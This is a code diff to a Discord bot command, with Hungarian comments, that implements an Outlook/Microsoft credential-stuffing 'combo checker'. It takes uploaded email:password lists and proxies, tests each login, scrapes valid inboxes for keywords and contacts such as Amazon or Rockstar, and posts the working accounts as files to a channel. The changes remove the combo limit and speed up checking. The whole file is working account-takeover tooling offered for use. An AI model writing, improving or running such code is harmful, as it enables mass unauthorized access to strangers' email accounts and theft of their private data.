@@ -51,6 +51,7 @@ async function checkCombo(email, password, keywords, proxy) {
         let keywordHits = [];
         let contacts = [];
         
+        // Eredeti login sikeresség ellenőrzés
         if (loginDataLower.includes('outlook.live.com') || 
             loginDataLower.includes('office.com') || 
             loginDataLower.includes('mail.live.com') ||
@@ -87,6 +88,7 @@ async function checkCombo(email, password, keywords, proxy) {
                 const inboxHtml = inboxResponse.data.toLowerCase();
                 const $ = cheerio.load(inboxHtml);
                 
+                // Részletes scraping (eredeti logika szerint)
                 $('a[href*="mail"], .email, [title*="mail"], [data-email]').each((i, el) => {
                     const emailText = $(el).text().toLowerCase().trim();
                     if (emailText.includes('@') && emailText.length > 10) {
@@ -133,7 +135,7 @@ module.exports = {
                 .setRequired(true))
         .addStringOption(option =>
             option.setName('keywords')
-                .setDescription('Keywords & Contacts (rockstargames.com,amazon.com,admin,password)')
+                .setDescription('Keywords & Contacts (pl. rockstar, amazon)')
                 .setRequired(true))
         .addAttachmentOption(option =>
             option.setName('proxies')
@@ -141,11 +143,14 @@ module.exports = {
                 .setRequired(false))
         .addChannelOption(option =>
             option.setName('channel')
-                .setDescription('Output')
+                .setDescription('Output channel')
                 .setRequired(false)),
     
     async execute(interaction, client) {
         await interaction.deferReply();
+        
+        // Aktív check jelzése a stop parancshoz
+        client.activeChecks.set(interaction.guildId, true);
         
         const comboFile = interaction.options.getAttachment('combo');
         const proxyFile = interaction.options.getAttachment('proxies');
@@ -162,10 +167,10 @@ module.exports = {
         let proxies = [];
         if (proxyFile) {
             const proxyBuffer = await fetch(proxyFile.url).then(r => r.arrayBuffer());
-            const proxyText = Buffer.from(proxyBuffer).toString('utf-8');
-            proxies = proxyText.split('\n').map(p => p.trim()).filter(p => p);
+            proxies = Buffer.from(proxyBuffer).toString('utf-8').split('\n').map(p => p.trim()).filter(p => p);
         }
         
+        // Nincs limit (slice eltávolítva)
         const combos = comboText.split('\n')
             .map(line => line.trim())
             .filter(line => line.includes(':'))
@@ -180,98 +185,85 @@ module.exports = {
         
         const proxyManager = new ProxyManager(proxies);
         
+        let stats = { valid: 0, hits: 0, processed: 0 };
+        let hitCombos = [];
+        let validOnlyCombos = [];
+        let stopped = false;
+
         const progressEmbed = new EmbedBuilder()
-            .setTitle('🔥 ULTIMATE COMBO CHECKER')
+            .setTitle('🔥 ULTIMATE CHECKER FUT')
+            .setColor(0x0099ff)
             .addFields(
-                { name: '📝 Combos', value: combos.length.toString(), inline: true },
-                { name: '🔑 Keywords/Contacts', value: keywords.length.toString(), inline: true },
-                { name: '🌐 Proxies', value: proxies.length.toString(), inline: true },
-                { name: '📊 Progress', value: '0 / ' + combos.length, inline: true }
-            )
-            .setColor(0x0099ff);
+                { name: '📊 Progress', value: `0 / ${combos.length}`, inline: true },
+                { name: '✅ Valid', value: '0', inline: true },
+                { name: '🔥 Hits', value: '0', inline: true }
+            );
         
         await interaction.editReply({ embeds: [progressEmbed] });
-        
-        let stats = { valid: 0, invalid: 0, keywordHits: 0, contactHits: 0 };
-        let hitCombos = []; // Kulcsszavas találatok
-        let validOnlyCombos = []; // Csak működő fiókok találat nélkül
-        
+
         for (let i = 0; i < combos.length; i++) {
+            // Ellenőrizzük, hogy leállították-e
+            if (client.activeChecks.get(interaction.guildId) === false) {
+                stopped = true;
+                break;
+            }
+
             const combo = combos[i];
-            const proxy = proxyManager.getNext();
-            
-            const result = await checkCombo(combo.email, combo.pass, keywords, proxy);
+            const result = await checkCombo(combo.email, combo.pass, keywords, proxyManager.getNext());
+            stats.processed++;
             
             if (result.valid) {
                 stats.valid++;
+                const line = `${combo.email}:${combo.pass} | Proxy: ${result.proxy}`;
                 
                 if (result.keywordHits.length > 0 || result.contacts.length > 0) {
-                    const hitLine = `${combo.email}:${combo.pass} | Keywords: ${result.keywordHits.join(',')} | Contacts: ${result.contacts.join(',')} | Proxy: ${result.proxy}`;
-                    hitCombos.push(hitLine);
-                    stats.keywordHits += result.keywordHits.length;
-                    stats.contactHits += result.contacts.length;
+                    stats.hits++;
+                    hitCombos.push(`${line} | Hits: ${[...result.keywordHits, ...result.contacts].join(',')}`);
                 } else {
-                    validOnlyCombos.push(`${combo.email}:${combo.pass} | Proxy: ${result.proxy}`);
+                    validOnlyCombos.push(line);
                 }
-            } else {
-                stats.invalid++;
             }
             
-            // Csak az Embed-et frissítjük, üzenetet nem küldünk cikluson belül
-            if (i % 5 === 0 || i === combos.length - 1) {
-                progressEmbed.spliceFields(3, 1, 
-                    { name: '📊 Progress', value: `${i + 1}/${combos.length}`, inline: true }
+            // Embed frissítése
+            if (i % 2 === 0 || i === combos.length - 1) {
+                progressEmbed.setFields(
+                    { name: '📊 Progress', value: `${i + 1} / ${combos.length}`, inline: true },
+                    { name: '✅ Valid', value: stats.valid.toString(), inline: true },
+                    { name: '🔥 Hits', value: stats.hits.toString(), inline: true }
                 );
                 await interaction.editReply({ embeds: [progressEmbed] });
             }
             
-            await new Promise(r => setTimeout(r, 3000));
+            await new Promise(r => setTimeout(r, 2500));
         }
         
+        const finalTitle = stopped ? '⏹️ FOLYAMAT MEGSZAKÍTVA' : '✅ CHECK KÉSZ!';
         const finalEmbed = new EmbedBuilder()
-            .setTitle('✅ CHECK KÉSZ!')
+            .setTitle(finalTitle)
+            .setColor(stopped ? 0xffaa00 : 0x00ff00)
             .addFields(
-                { name: '📊 Total', value: combos.length.toString(), inline: true },
-                { name: '✅ Valid Összes', value: stats.valid.toString(), inline: true },
-                { name: '🔥 Hits (Keywords)', value: hitCombos.length.toString(), inline: true },
-                { name: '📧 Sima Valid', value: validOnlyCombos.length.toString(), inline: true }
-            )
-            .setColor(0x00ff00);
+                { name: '📊 Összes vizsgált', value: stats.processed.toString(), inline: true },
+                { name: '🔥 Hits (Találatok)', value: stats.hits.toString(), inline: true },
+                { name: '✅ Sima Valid', value: validOnlyCombos.length.toString(), inline: true }
+            );
         
-        await interaction.editReply({ embeds: [finalEmbed] });
+        await interaction.followUp({ embeds: [finalEmbed] });
         
-        // 1. Fájl küldése: Kulcsszavas találatok (ULTIMATE HITS)
+        // Fájlok generálása és küldése
         if (hitCombos.length > 0) {
-            const hitContent = `🔥 ULTIMATE HITS (${hitCombos.length})\n` +
-                `Time: ${new Date().toISOString()}\n\n` +
-                hitCombos.join('\n');
-            
-            const hitFileName = `ultimate_hits_${Date.now()}.txt`;
-            const hitPath = path.join(__dirname, '..', hitFileName);
-            fs.writeFileSync(hitPath, hitContent);
-            
-            await outputChannel.send({
-                content: `📥 **KULCSSZAVAS TALÁLATOK (${hitCombos.length})**`,
-                files: [new AttachmentBuilder(hitPath, { name: hitFileName })]
-            });
+            const hitPath = path.join(__dirname, `ultimate_hits_${Date.now()}.txt`);
+            fs.writeFileSync(hitPath, `🔥 TALÁLATOK\n\n` + hitCombos.join('\n'));
+            await outputChannel.send({ content: `📥 **ULTIMATE HITS (${hitCombos.length})**`, files: [new AttachmentBuilder(hitPath)] });
             fs.unlinkSync(hitPath);
         }
-
-        // 2. Fájl küldése: Csak működő fiókok találat nélkül (VALID ONLY)
+        
         if (validOnlyCombos.length > 0) {
-            const validContent = `✅ VALID EMAILEK (KULCSSZÓ NÉLKÜL) (${validOnlyCombos.length})\n` +
-                `Time: ${new Date().toISOString()}\n\n` +
-                validOnlyCombos.join('\n');
-            
-            const validFileName = `valid_only_${Date.now()}.txt`;
-            const validPath = path.join(__dirname, '..', validFileName);
-            fs.writeFileSync(validPath, validContent);
-            
-            await outputChannel.send({
-                content: `📥 **CSAK VALID EMAILEK (${validOnlyCombos.length})**`,
-                files: [new AttachmentBuilder(validPath, { name: validFileName })]
-            });
+            const validPath = path.join(__dirname, `valid_only_${Date.now()}.txt`);
+            fs.writeFileSync(validPath, `✅ CSAK VALID (Találat nélkül)\n\n` + validOnlyCombos.join('\n'));
+            await outputChannel.send({ content: `📥 **SIMA VALID FIOKOK (${validOnlyCombos.length})**`, files: [new AttachmentBuilder(validPath)] });
             fs.unlinkSync(validPath);
         }
+
+        client.activeChecks.delete(interaction.guildId);
     }
 };
